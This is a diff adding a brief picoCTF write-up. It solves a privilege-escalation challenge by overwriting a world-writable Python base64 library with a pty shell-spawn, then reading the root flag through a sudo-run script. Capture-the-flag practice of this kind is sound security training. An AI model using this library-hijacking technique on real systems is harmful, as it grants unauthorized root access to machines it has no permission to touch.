@@ -1,0 +1,14 @@
+ssh into the machine
+
+picoctf user can run python3 /home/picoctf/.server.py as sudo
+you can check it by running sudo -l
+
+look at the libs on /usr/llib/python3.8
+base64 has 777 permissions
+
+so we just need to spawn a shell inside the base64.py file:
+
+import pty
+pty.spawn("/bin/sh")
+
+then just cat /root/.flag.txt
